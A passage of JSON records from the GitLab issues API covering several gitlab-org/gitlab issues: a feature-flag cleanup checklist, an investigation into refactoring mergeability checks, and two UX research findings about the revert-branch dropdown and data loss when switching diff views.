feature flag status --\u003e\n- [x] Create a merge request !88907 to remove `update_storage_usage_design` feature flag. Ask for review and merge it.\n    - [x] Remove all references to the feature flag from the codebase.\n    - [x] Remove the YAML definitions for the feature from the repository.\n    - [x] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [x] Ensure that the cleanup MR has been deployed to both production and canary.\n      If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [x] `/chatops run auto_deploy status \u003cmerge-commit-of-cleanup-mr\u003e`\n- [x] Close [the feature issue](ISSUE LINK) to indicate the feature will be released in the current milestone.\n- [x] Clean up the feature flag from all environments by running these chatops command in `#production` channel:\n    - [x] `/chatops run feature delete update_storage_usage_design --dev`\n    - [x] `/chatops run feature delete update_storage_usage_design --staging`\n    - [x] `/chatops run feature delete update_storage_usage_design`\n- [x] Close this rollout issue.\n\n## Rollback Steps\n\n- [ ] This feature can be disabled by running the following Chatops command:\n\n```\n/chatops run feature set update_storage_usage_design false\n```","state":"closed","created_at":"2022-04-08T07:47:11.801Z","updated_at":"2022-08-10T09:41:35.149Z","closed_at":"2022-06-08T12:27:42.758Z","closed_by":{"id":127064,"username":"aalakkad","name":"Ammar Alakkad","state":"active","avatar_url":"https://secure.gravatar.com/avatar/ecc1130ce340f5080afd8f2c9962948a?s=80\u0026d=identicon","web_url":"https://gitlab.com/aalakkad"},"labels":["[deprecated] Category:Utilization","devops::fulfillment","feature flag","feature::addition","frontend","group::utilization","missed:15.0","section::fulfillment","type::feature","workflow::verification"],"milestone":{"id":2453022,"iid":73,"group_id":9970,"title":"15.1","description":"","state":"active","created_at":"2022-02-03T22:23:29.335Z","updated_at":"2022-02-03T22:23:29.335Z","due_date":"2022-06-17","start_date":"2022-05-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/73"},"assignees":[{"id":127064,"username":"aalakkad","name":"Ammar Alakkad","state":"active","avatar_url":"https://secure.gravatar.com/avatar/ecc1130ce340f5080afd8f2c9962948a?s=80\u0026d=identicon","web_url":"https://gitlab.com/aalakkad"},{"id":8858358,"username":"sheldonled","name":"Sheldon Led","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4a4252822d6a503697403c631ca987dc?s=80\u0026d=identicon","web_url":"https://gitlab.com/sheldonled"}],"author":{"id":127064,"username":"aalakkad","name":"Ammar Alakkad","state":"active","avatar_url":"https://secure.gravatar.com/avatar/ecc1130ce340f5080afd8f2c9962948a?s=80\u0026d=identicon","web_url":"https://gitlab.com/aalakkad"},"type":"ISSUE","assignee":{"id":127064,"username":"aalakkad","name":"Ammar Alakkad","state":"active","avatar_url":"https://secure.gravatar.com/avatar/ecc1130ce340f5080afd8f2c9962948a?s=80\u0026d=identicon","web_url":"https://gitlab.com/aalakkad"},"user_notes_count":25,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/358296","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":35,"completed_count":34},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"34 of 35 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/358296","notes":"https://gitlab.com/api/v4/projects/278964/issues/358296/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/358296/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#358296","relative":"#358296","full":"gitlab-org/gitlab#358296"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":106295867,"iid":358237,"project_id":278964,"title":"[Investigation] Split out mergeable/mergeable_state into more cohesive methods","description":"When trying to move some code from `mergeable` -\u003e `mergeable_state`, we had an incident occur (https://gitlab.com/gitlab-com/gl-infra/production/-/issues/6788). This incident was due to `mergeable_state` being used to check if we can run a merged result pipeline. https://gitlab.com/gitlab-com/gl-infra/production/-/issues/6788#note_905268171 explains further.\n\n`mergeable_state` is ambiguous in naming, and the assumption here is that it is can be merged, and then we have `mergeable` which could imply the same checks as `mergeable_state`. `mergeable` calls `mergeable_state` so `mergeable_state` is a subset of checks of `mergeable`\n\nTherefore, this issue is to investigate the different uses of `mergeable_state` and potentially split it out into different methods, for example, a new method that checks if it is mergeable on a git level.\n\u003c!-- triage-serverless v3 PLEASE DO NOT REMOVE THIS SECTION --\u003e\n*This page may contain information related to upcoming products, features and functionality.\nIt is important to note that the information presented is for informational purposes only, so please do not rely on the information for purchasing or planning purposes.\nJust like with all projects, the items mentioned on the page are subject to change or delay, and the development, release, and timing of any products, features, or functionality remain at the sole discretion of GitLab Inc.*\n\u003c!-- triage-serverless v3 PLEASE DO NOT REMOVE THIS SECTION --\u003e","state":"closed","created_at":"2022-04-08T03:14:26.428Z","updated_at":"2022-08-10T16:17:28.824Z","closed_at":"2022-06-14T20:53:57.572Z","closed_by":{"id":40375,"username":"kerrizor","name":"Kerri Miller","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/40375/avatar.png","web_url":"https://gitlab.com/kerrizor"},"labels":["Category:Code Review Workflow","Deliverable","backend","devops::create","direction","group::code review","missed-deliverable","missed:15.0","needs investigation","section::dev","type::feature","workflow::verification"],"milestone":{"id":2453022,"iid":73,"group_id":9970,"title":"15.1","description":"","state":"active","created_at":"2022-02-03T22:23:29.335Z","updated_at":"2022-02-03T22:23:29.335Z","due_date":"2022-06-17","start_date":"2022-05-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/73"},"assignees":[{"id":40375,"username":"kerrizor","name":"Kerri Miller","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/40375/avatar.png","web_url":"https://gitlab.com/kerrizor"},{"id":5918904,"username":"marc_shaw","name":"Marc Shaw","state":"active","avatar_url":"https://secure.gravatar.com/avatar/78c946cb19e40815a2b5d97cefecec6a?s=80\u0026d=identicon","web_url":"https://gitlab.com/marc_shaw"}],"author":{"id":5918904,"username":"marc_shaw","name":"Marc Shaw","state":"active","avatar_url":"https://secure.gravatar.com/avatar/78c946cb19e40815a2b5d97cefecec6a?s=80\u0026d=identicon","web_url":"https://gitlab.com/marc_shaw"},"type":"ISSUE","assignee":{"id":40375,"username":"kerrizor","name":"Kerri Miller","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/40375/avatar.png","web_url":"https://gitlab.com/kerrizor"},"user_notes_count":8,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/358237","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/358237","notes":"https://gitlab.com/api/v4/projects/278964/issues/358237/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/358237/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#358237","relative":"#358237","full":"gitlab-org/gitlab#358237"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":5598,"epic":{"id":226017,"iid":5598,"title":"ðŸ§˜  Better defined mergeability","url":"/groups/gitlab-org/-/epics/5598","group_id":9970,"human_readable_end_date":"Nov 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":106285900,"iid":358218,"project_id":278964,"title":"Show more branches in the drop down menu while reverting a merge request","description":"\u003c!-- Actionable insights must recommend an action that needs to take place. An actionable insight both defines the insight and clearly calls out action or next step required to improve based on the result of the research observation or data. Actionable insights are tracked over time and will include follow-up. Please follow the tasks outlined in this issue for best results. Learn more in the handbook here: https://about.gitlab.com/handbook/engineering/ux/ux-research-training/research-insights/#actionable-insights \n\nThis issue template is for an actionable insight that requires a change in the product.--\u003e\n\n\n\n### Insight\n\u003c!-- Describe the insight itself: often the problem, finding, or observation.--\u003e\n\nThe appearance of the drop down (see below), with only one branch visible, gives the impression that only one option is possible here. Users struggled to realize they needed to clear the search box and begin typing to receive other options.\n\n![image](/uploads/c95ab74702a17748c14da5f9294adabb/image.png)\n\n### Supporting evidence\n\u003c!-- Describe why the problem is happening, or more details behind the finding or observation. Try to include quotes or specific data collected. Feel free to link the Actionable insight from Dovetail here if applicable instead of retyping details. --\u003e\n\nSeveral users encountered difficulty with this part of the UI during the 'revert merge request' task of the Q1FY23 Create Stage benchmarking. \n\n### Action\n\u003c!--Since this is an actionable insight that requires a change in the product, ensure the action is algned to that. Describe the next step or action that needs to take place as a result of the research. The action should be clearly defined, achievable, and directly tied back to the insight. Make sure to use directive terminology, such as: change, update, add/remove, etc. --\u003e\n\n- Show more branches in the drop down menu while reverting a merge request.\n\n### Resources\n \u003c!--Add resources as links below or as related issues. --\u003e\n\n- :dove: [Dovetail project](https://dovetailapp.com/projects/30oYRVm3wl8esIuImxTdrz/v/5hZuPwhf3XBWiHicyCchQ9)\n- :mag: [Research issue](https://gitlab.com/groups/gitlab-org/-/epics/7205)\n- :footprints: [Follow-up issue or epic](Paste URL for follow-up issue or epic here)\n\n\n## Proposal\n\nThe branch dropdown in the revert modal should not have the search box pre-filled with a branch name.","state":"closed","created_at":"2022-04-07T23:11:26.034Z","updated_at":"2023-01-03T23:17:20.244Z","closed_at":"2022-12-15T21:18:26.927Z","closed_by":{"id":4414431,"username":"thomasrandolph","name":"Thomas Randolph","state":"active","avatar_url":"https://secure.gravatar.com/avatar/6462fcd577d8c957abd2dc23956cfbec?s=80\u0026d=identicon","web_url":"https://gitlab.com/thomasrandolph"},"labels":["Actionable Insight::Product change","Deliverable","Hacktoberfest","Ready for Blog","SUS::Impacting","Usability benchmark","[deprecated] Accepting merge requests","auto updated","closed::complete","devops::create","feature::enhancement","frontend","group::code review","priority::4","section::dev","severity::4","type::feature","workflow::production"],"milestone":{"id":2717597,"iid":82,"group_id":9970,"title":"15.7","description":"","state":"active","created_at":"2022-07-29T14:48:31.199Z","updated_at":"2022-07-29T14:48:31.199Z","due_date":"2022-12-17","start_date":"2022-11-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/82"},"assignees":[{"id":4414431,"username":"thomasrandolph","name":"Thomas Randolph","state":"active","avatar_url":"https://secure.gravatar.com/avatar/6462fcd577d8c957abd2dc23956cfbec?s=80\u0026d=identicon","web_url":"https://gitlab.com/thomasrandolph"}],"author":{"id":10060155,"username":"leducmills","name":"Ben Leduc-Mills","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/10060155/avatar.png","web_url":"https://gitlab.com/leducmills"},"type":"ISSUE","assignee":{"id":4414431,"username":"thomasrandolph","name":"Thomas Randolph","state":"active","avatar_url":"https://secure.gravatar.com/avatar/6462fcd577d8c957abd2dc23956cfbec?s=80\u0026d=identicon","web_url":"https://gitlab.com/thomasrandolph"},"user_notes_count":14,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/358218","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/358218","notes":"https://gitlab.com/api/v4/projects/278964/issues/358218/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/358218/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#358218","relative":"#358218","full":"gitlab-org/gitlab#358218"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":106285761,"iid":358217,"project_id":278964,"title":"Fix data loss when switching from inline to side-by-side view on MR creation page","description":"\u003c!-- Actionable insights must recommend an action that needs to take place. An actionable insight both defines the insight and clearly calls out action or next step required to improve based on the result of the research observation or data. Actionable insights are tracked over time and will include follow-up. Please follow the tasks outlined in this issue for best results. Learn more in the handbook here: https://about.gitlab.com/handbook/engineering/ux/ux-research-training/research-insights/#actionable-insights \n\nThis issue template is for an actionable insight that requires a change in the product.--\u003e\n\n### Insight\n\u003c!-- Describe the insight itself: often the problem, finding, or observation.--\u003e\nWhen switching from the inline to side-by-side code comparison at the bottom of the create merge request page, the page gets refreshed, the user is directed back to the top of the page, and any other information on the page is lost.\n\n### Supporting evidence\n\u003c!-- Describe why the problem is happening, or more details behind the finding or observation. Try to include quotes or specific data collected. Feel free to link the Actionable insight from Dovetail here if applicable instead of retyping details. --\u003e\n\nDuring the Q1FY23 Create stage benchmarking study, this was encountered by over a dozen users during the 'confirm proposed changes' task.\n\n\u003e When I change this, it takes me back to the top of the page, which is a bit confusing...I would ideally prefer to stay here only.\nâ€“ S-15\n\n![image](/uploads/6e1e6dd4f6b5c8aa37ad968081d50fa7/image.png)\n\n### Action\n\u003c!--Since this is an actionable insight that requires a change in the product, ensure the action is algned to that. Describe the next step or action that needs to take place as a result of the research. The action should be clearly defined, achievable, and directly tied back to the insight. Make sure to use directive terminology, such as: change, update, add/remove, etc. --\u003e\n\n- Do not trigger a refresh, redirection, or incur data loss when switching between inline and side-to-side views on the MR creation page.\n\n### Resources\n \u003c!--Add resources as links below or as related issues. --\u003e\n\n- :dove: [Dovetail project](https://dovetailapp.com/projects/30oYRVm3wl8esIuImxTdrz/v/5hZuPwhf3XBWiHicyCchQ9)\n- :mag: [Research issue](https://gitlab.com/groups/gitlab-org/-/epics/7205)\n- :footprints: [Follow-up issue or epic](Paste URL for follow-up issue or epic here)\n\n### Proposal\n\n- Make the inline/parallel mode reload the Changes portion by re-requesting the diffs HTML from the server","state":"closed","created_at":"2022-04-07T23:02:15.484Z","updated_at":"2023-01-03T23:17:20.339Z","closed_at":"2022-12-26T11:26:18.363Z","closed_by":{"id":626804,"username":"pedroms","name":"Pedro Moreira da Silva","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c306f087d191ac15549f3c11e3bed321?s=80\u0026d=identicon","web_url":"https://gitlab.com/pedroms"},"labels":["Actionable Insight::Product change","Deliverable","Hacktoberfest","Ready for Blog","SUS::Impacting","Usability benchmark","[deprecated] Accepting merge requests","auto updated","closed::complete","devops::create","feature::enhancement","frontend","group::code review","missed-deliverable","missed:15.7","section::dev","severity::1","type::feature","workflow::in dev"],"milestone":{"id":2745648,"iid":83,"group_id":9970,"title":"15.8","description":"","state":"active","created_at":"2022-08-22T16:57:34.875Z","updated_at":"2022-08-22T16:57:34.875Z","due_date":"2023-01-17","start_date":"2022-12-18","expired":false,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/83"},"assignees":[{"id":4414431,"username":"thomasrandolph","name":"Thomas Randolph","state":"active","avatar_url":"https://secure.gravatar.com/avatar/6462fcd577d8c957abd2dc23956cfbec?s=80\u0026d=identicon","web_url":"https://gitlab.com/thomasrandolph"}],"author":{"id":10060155,"username":"leducmills","name":"Ben Leduc-Mills","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/10060155/avatar.png","web_url":"https://gitlab.com/leducmills"},"type":"ISSUE","assignee":{"id":4414431,"username":"thomasrandolph","name":"Thomas Randolph","state":"active","avatar_url":"https://secure.gravatar.com/avatar/6462fcd577d8c957abd2dc23956cfbec?s=80\u0026d=identicon","web_url":"https://gitlab.com/thomasrandolph"},"user_notes_count":26,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/358217","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/358217","notes":"https://gitlab.com/api/v4/projects/278964/issues/358217/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/358217/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#358217","relative":"#358217","full":"gitlab-org/gitlab#358217"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null}]